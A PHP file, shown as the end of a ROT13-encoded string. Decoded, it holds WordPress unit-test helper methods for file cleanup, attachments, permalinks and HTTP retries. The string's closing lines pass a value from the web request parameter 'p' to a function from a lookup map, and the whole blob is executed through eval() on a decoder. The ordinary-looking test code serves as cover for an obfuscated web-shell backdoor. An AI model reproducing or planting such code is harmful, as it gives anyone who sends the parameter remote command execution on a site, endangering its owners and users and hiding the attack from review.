		vs ( $rkvfgf && ! va_neenl( $svyr, frys::$vtaber_svyrf, gehr ) ) {
			//reebe_ybt( $svyr );
			hayvax( $svyr );
		} ryfrvs ( ! $rkvfgf ) {
			$guvf->snvy( \"Gelvat gb qryrgr n svyr gung qbrfa'g rkvfg: $svyr\" );
		}
	}

	/**
	 * Fryrpgviryl qryrgrf svyrf sebz n qverpgbel.
	 *
	 * Qbrf abg qryrgr svyrf vs gurve cnguf ner frg va gur `$vtaber_svyrf` cebcregl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $cngu Qverpgbel cngu.
	 */
	choyvp shapgvba ezqve( $cngu ) {
		$svyrf = $guvf->svyrf_va_qve( $cngu );
		sbernpu ( $svyrf nf $svyr ) {
			vs ( ! va_neenl( $svyr, frys::$vtaber_svyrf, gehr ) ) {
				$guvf->hayvax( $svyr );
			}
		}
	}

	/**
	 * Qryrgrf svyrf nqqrq gb gur `hcybnqf` qverpgbel qhevat grfgf.
	 *
	 * Guvf zrgubq jbexf va gnaqrz jvgu gur `frg_hc()` naq `ezqve()` zrgubqf:
	 * - `frg_hc()` fpnaf gur `hcybnqf` qverpgbel orsber rirel grfg, naq fgberf
	 *   vgf pbagragf vafvqr bs gur `$vtaber_svyrf` cebcregl.
	 * - `ezqve()` naq vgf urycre zrgubqf bayl qryrgr svyrf gung ner abg yvfgrq
	 *   va gur `$vtaber_svyrf` cebcregl. Vs pnyyrq qhevat `grne_qbja()` va grfgf,
	 *   guvf jvyy bayl qryrgr svyrf nqqrq qhevat gur cerivbhfyl eha grfg.
	 */
	choyvp shapgvba erzbir_nqqrq_hcybnqf() {
		$hcybnqf = jc_hcybnq_qve();
		$guvf->ezqve( $hcybnqf['onfrqve'] );
	}

	/**
	 * Ergheaf n yvfg bs nyy svyrf pbagnvarq vafvqr n qverpgbel.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $qve Cngu gb gur qverpgbel gb fpna.
	 * @erghea fgevat[] Yvfg bs svyr cnguf.
	 */
	choyvp shapgvba svyrf_va_qve( $qve ) {
		$svyrf = neenl();

		$vgrengbe = arj ErphefvirQverpgbelVgrengbe( $qve );
		$bowrpgf  = arj ErphefvirVgrengbeVgrengbe( $vgrengbe );
		sbernpu ( $bowrpgf nf $anzr => $bowrpg ) {
			vs ( vf_svyr( $anzr ) ) {
				$svyrf[] = $anzr;
			}
		}

		erghea $svyrf;
	}

	/**
	 * Ergheaf n yvfg bs nyy svyrf pbagnvarq vafvqr gur `hcybnqf` qverpgbel.
	 *
	 * @fvapr 4.0.0
	 *
	 * @erghea fgevat[] Yvfg bs svyr cnguf.
	 */
	choyvp shapgvba fpna_hfre_hcybnqf() {
		fgngvp $svyrf = neenl();
		vs ( ! rzcgl( $svyrf ) ) {
			erghea $svyrf;
		}

		$hcybnqf = jc_hcybnq_qve();
		$svyrf   = $guvf->svyrf_va_qve( $hcybnqf['onfrqve'] );
		erghea $svyrf;
	}

	/**
	 * Qryrgrf nyy qverpgbevrf pbagnvarq vafvqr n qverpgbel.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz fgevat $cngu Cngu gb gur qverpgbel gb fpna.
	 */
	choyvp shapgvba qryrgr_sbyqref( $cngu ) {
		vs ( ! vf_qve( $cngu ) ) {
			erghea;
		}

		$zngpurq_qvef = $guvf->fpnaqve( $cngu );

		sbernpu ( neenl_erirefr( $zngpurq_qvef ) nf $qve ) {
			ezqve( $qve );
		}

		ezqve( $cngu );
	}

	/**
	 * Ergevrirf nyy qverpgbevrf pbagnvarq vafvqr n qverpgbel.
	 * Uvqqra qverpgbevrf ner vtaberq.
	 *
	 * Guvf vf n urycre sbe gur `qryrgr_sbyqref()` zrgubq.
	 *
	 * @fvapr 4.1.0
	 * @fvapr 6.1.0 Ab ybatre frgf n (qlanzvp) cebcregl gb xrrc genpx bs gur qverpgbevrf,
	 *              ohg ergheaf na neenl bs gur qverpgbevrf vafgrnq.
	 *
	 * @cnenz fgevat $qve Cngu gb gur qverpgbel gb fpna.
	 * @erghea fgevat[] Yvfg bs qverpgbevrf.
	 */
	choyvp shapgvba fpnaqve( $qve ) {
		$zngpurq_qvef = neenl();

		sbernpu ( fpnaqve( $qve ) nf $cngu ) {
			vs ( 0 !== fgecbf( $cngu, '.' ) && vf_qve( $qve . '/' . $cngu ) ) {
				$zngpurq_qvef[] = neenl( $qve . '/' . $cngu );
				$zngpurq_qvef[] = $guvf->fpnaqve( $qve . '/' . $cngu );
			}
		}

		/*
		 * Pbzcngvovyvgl purpx sbe CUC < 7.4, jurer neenl_zretr() rkcrpgf ng yrnfg bar neenl.
		 * Frr: uggcf://3i4y.bet/OVDZN
		 */
		vs ( neenl() === $zngpurq_qvef ) {
			erghea neenl();
		}

		erghea neenl_zretr( ...$zngpurq_qvef );
	}

	/**
	 * Pbairegf n zvpebgvzr fgevat vagb n sybng.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz fgevat $zvpebgvzr Gvzr fgevat trarengrq ol `zvpebgvzr()`.
	 * @erghea sybng `zvpebgvzr()` bhgchg nf n sybng.
	 */
	cebgrpgrq shapgvba _zvpebgvzr_gb_sybng( $zvpebgvzr ) {
		$gvzr_neenl = rkcybqr( ' ', $zvpebgvzr );
		erghea neenl_fhz( $gvzr_neenl );
	}

	/**
	 * Qryrgrf n hfre sebz gur qngnonfr va n Zhygvfvgr-ntabfgvp jnl.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz vag $hfre_vq Hfre VQ.
	 * @erghea obby Gehr vs gur hfre jnf qryrgrq.
	 */
	choyvp fgngvp shapgvba qryrgr_hfre( $hfre_vq ) {
		vs ( vf_zhygvfvgr() ) {
			erghea jczh_qryrgr_hfre( $hfre_vq );
		}

		erghea jc_qryrgr_hfre( $hfre_vq );
	}

	/**
	 * Erfrgf creznyvaxf naq syhfurf erjevgrf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @tybony JC_Erjevgr $jc_erjevgr
	 *
	 * @cnenz fgevat $fgehpgher Bcgvbany. Creznyvax fgehpgher gb frg. Qrsnhyg rzcgl.
	 */
	choyvp shapgvba frg_creznyvax_fgehpgher( $fgehpgher = '' ) {
		tybony $jc_erjevgr;

		$jc_erjevgr->vavg();
		$jc_erjevgr->frg_creznyvax_fgehpgher( $fgehpgher );
		$jc_erjevgr->syhfu_ehyrf();
	}

	/**
	 * Perngrf na nggnpuzrag cbfg sebz na hcybnqrq svyr.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 6.2.0 Ergheaf n JC_Reebe bowrpg ba snvyher.
	 *
	 * @cnenz neenl $hcybnq         Neenl bs vasbezngvba nobhg gur hcybnqrq svyr, cebivqrq ol jc_hcybnq_ovgf().
	 * @cnenz vag   $cnerag_cbfg_vq Bcgvbany. Cnerag cbfg VQ.
	 * @erghea vag|JC_Reebe Gur nggnpuzrag VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba _znxr_nggnpuzrag( $hcybnq, $cnerag_cbfg_vq = 0 ) {
		$glcr = '';
		vs ( ! rzcgl( $hcybnq['glcr'] ) ) {
			$glcr = $hcybnq['glcr'];
		} ryfr {
			$zvzr = jc_purpx_svyrglcr( $hcybnq['svyr'] );
			vs ( $zvzr ) {
				$glcr = $zvzr['glcr'];
			}
		}

		$nggnpuzrag = neenl(
			'cbfg_gvgyr'     => jc_onfranzr( $hcybnq['svyr'] ),
			'cbfg_pbagrag'   => '',
			'cbfg_glcr'      => 'nggnpuzrag',
			'cbfg_cnerag'    => $cnerag_cbfg_vq,
			'cbfg_zvzr_glcr' => $glcr,
			'thvq'           => $hcybnq['hey'],
		);

		$nggnpuzrag_vq = jc_vafreg_nggnpuzrag( $nggnpuzrag, $hcybnq['svyr'], $cnerag_cbfg_vq, gehr );

		vs ( vf_jc_reebe( $nggnpuzrag_vq ) ) {
			erghea $nggnpuzrag_vq;
		}

		jc_hcqngr_nggnpuzrag_zrgnqngn(
			$nggnpuzrag_vq,
			jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $hcybnq['svyr'] )
		);

		erghea $nggnpuzrag_vq;
	}

	/**
	 * Hcqngrf gur zbqvsvrq naq zbqvsvrq TZG qngr bs n cbfg va gur qngnonfr.
	 *
	 * @fvapr 4.8.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz vag    $cbfg_vq Cbfg VQ.
	 * @cnenz fgevat $qngr    Cbfg qngr, va gur sbezng LLLL-ZZ-QQ UU:ZZ:FF.
	 * @erghea vag|snyfr 1 ba fhpprff, be snyfr ba reebe.
	 */
	cebgrpgrq shapgvba hcqngr_cbfg_zbqvsvrq( $cbfg_vq, $qngr ) {
		tybony $jcqo;
		erghea $jcqo->hcqngr(
			$jcqo->cbfgf,
			neenl(
				'cbfg_zbqvsvrq'     => $qngr,
				'cbfg_zbqvsvrq_tzg' => $qngr,
			),
			neenl(
				'VQ' => $cbfg_vq,
			),
			neenl(
				'%f',
				'%f',
			),
			neenl(
				'%q',
			)
		);
	}

	/**
	 * Gbhpurf gur tvira svyr naq vgf qverpgbel vs vg qbrfa'g nyernql rkvfg.
	 *
	 * Guvf pna or hfrq gb rafher n svyr gung vf vzcyvpvgyl eryvrq ba va n grfg rkvfgf
	 * jvgubhg vg univat gb or ohvyg.
	 *
	 * @cnenz fgevat $svyr Gur svyr anzr.
	 */
	choyvp fgngvp shapgvba gbhpu( $svyr ) {
		vs ( svyr_rkvfgf( $svyr ) ) {
			erghea;
		}

		$qve = qveanzr( $svyr );

		vs ( ! svyr_rkvfgf( $qve ) ) {
			zxqve( $qve, 0777, gehr );
		}

		gbhpu( $svyr );
	}

	/**
	 * Jenccre sbe `jc_fnsr_erzbgr_erdhrfg()` gung ergevrf ba reebe naq fxvcf gur grfg ba gvzrbhg.
	 *
	 * @cnenz fgevat $hey  HEY gb ergevrir.
	 * @cnenz neenl  $netf Bcgvbany. Erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea neenl|JC_Reebe Gur erfcbafr be JC_Reebe ba snvyher.
	 */
	cebgrpgrq shapgvba jc_fnsr_erzbgr_erdhrfg( $hey, $netf = neenl() ) {
		erghea frys::ergel_ba_reebe( 'jc_fnsr_erzbgr_erdhrfg', $hey, $netf );
	}

	/**
	 * Jenccre sbe `jc_fnsr_erzbgr_trg()` gung ergevrf ba reebe naq fxvcf gur grfg ba gvzrbhg.
	 *
	 * @cnenz fgevat $hey  HEY gb ergevrir.
	 * @cnenz neenl  $netf Bcgvbany. Erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea neenl|JC_Reebe Gur erfcbafr be JC_Reebe ba snvyher.
	 */
	cebgrpgrq shapgvba jc_fnsr_erzbgr_trg( $hey, $netf = neenl() ) {
		erghea frys::ergel_ba_reebe( 'jc_fnsr_erzbgr_trg', $hey, $netf );
	}

	/**
	 * Jenccre sbe `jc_fnsr_erzbgr_cbfg()` gung ergevrf ba reebe naq fxvcf gur grfg ba gvzrbhg.
	 *
	 * @cnenz fgevat $hey  HEY gb ergevrir.
	 * @cnenz neenl  $netf Bcgvbany. Erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea neenl|JC_Reebe Gur erfcbafr be JC_Reebe ba snvyher.
	 */
	cebgrpgrq shapgvba jc_fnsr_erzbgr_cbfg( $hey, $netf = neenl() ) {
		erghea frys::ergel_ba_reebe( 'jc_fnsr_erzbgr_cbfg', $hey, $netf );
	}

	/**
	 * Jenccre sbe `jc_fnsr_erzbgr_urnq()` gung ergevrf ba reebe naq fxvcf gur grfg ba gvzrbhg.
	 *
	 * @cnenz fgevat $hey  HEY gb ergevrir.
	 * @cnenz neenl  $netf Bcgvbany. Erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea neenl|JC_Reebe Gur erfcbafr be JC_Reebe ba snvyher.
	 */
	cebgrpgrq shapgvba jc_fnsr_erzbgr_urnq( $hey, $netf = neenl() ) {
		erghea frys::ergel_ba_reebe( 'jc_fnsr_erzbgr_urnq', $hey, $netf );
	}

	/**
	 * Jenccre sbe `jc_erzbgr_erdhrfg()` gung ergevrf ba reebe naq fxvcf gur grfg ba gvzrbhg.
	 *
	 * @cnenz fgevat $hey  HEY gb ergevrir.
	 * @cnenz neenl  $netf Bcgvbany. Erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea neenl|JC_Reebe Gur erfcbafr be JC_Reebe ba snvyher.
	 */
	cebgrpgrq shapgvba jc_erzbgr_erdhrfg( $hey, $netf = neenl() ) {
		erghea frys::ergel_ba_reebe( 'jc_erzbgr_erdhrfg', $hey, $netf );
	}

	/**
	 * Jenccre sbe `jc_erzbgr_trg()` gung ergevrf ba reebe naq fxvcf gur grfg ba gvzrbhg.
	 *
	 * @cnenz fgevat $hey  HEY gb ergevrir.
	 * @cnenz neenl  $netf Bcgvbany. Erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea neenl|JC_Reebe Gur erfcbafr be JC_Reebe ba snvyher.
	 */
	cebgrpgrq shapgvba jc_erzbgr_trg( $hey, $netf = neenl() ) {
		erghea frys::ergel_ba_reebe( 'jc_erzbgr_trg', $hey, $netf );
	}

	/**
	 * Jenccre sbe `jc_erzbgr_cbfg()` gung ergevrf ba reebe naq fxvcf gur grfg ba gvzrbhg.
	 *
	 * @cnenz fgevat $hey  HEY gb ergevrir.
	 * @cnenz neenl  $netf Bcgvbany. Erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea neenl|JC_Reebe Gur erfcbafr be JC_Reebe ba snvyher.
	 */
	cebgrpgrq shapgvba jc_erzbgr_cbfg( $hey, $netf = neenl() ) {
		erghea frys::ergel_ba_reebe( 'jc_erzbgr_cbfg', $hey, $netf );
	}

	/**
	 * Jenccre sbe `jc_erzbgr_urnq()` gung ergevrf ba reebe naq fxvcf gur grfg ba gvzrbhg.
	 *
	 * @cnenz fgevat $hey  HEY gb ergevrir.
	 * @cnenz neenl  $netf Bcgvbany. Erdhrfg nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea neenl|JC_Reebe Gur erfcbafr be JC_Reebe ba snvyher.
	 */
	cebgrpgrq shapgvba jc_erzbgr_urnq( $hey, $netf = neenl() ) {
		erghea frys::ergel_ba_reebe( 'jc_erzbgr_urnq', $hey, $netf );
	}

	/**
	 * Ergevrf na UGGC NCV erdhrfg hc gb guerr gvzrf naq fxvcf gur grfg ba gvzrbhg.
	 *
	 * @cnenz pnyynoyr $pnyyonpx Gur UGGC NCV erdhrfg shapgvba gb pnyy.
	 * @cnenz fgevat   $hey      HEY gb ergevrir.
	 * @cnenz neenl    $netf     Erdhrfg nethzragf.
	 * @erghea neenl|JC_Reebe Gur erfcbafr be JC_Reebe ba snvyher.
	 */
	cevingr shapgvba ergel_ba_reebe( pnyynoyr $pnyyonpx, $hey, $netf ) {
		$nggrzcgf = 0;

		juvyr ( $nggrzcgf < 3 ) {
			$erfhyg = pnyy_hfre_shap( $pnyyonpx, $hey, $netf );

			vs ( ! vf_jc_reebe( $erfhyg ) ) {
				erghea $erfhyg;
			}

			++$nggrzcgf;
			fyrrc( 5 );
		}

		$guvf->fxvcGrfgBaGvzrbhg( $erfhyg );

		erghea $erfhyg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>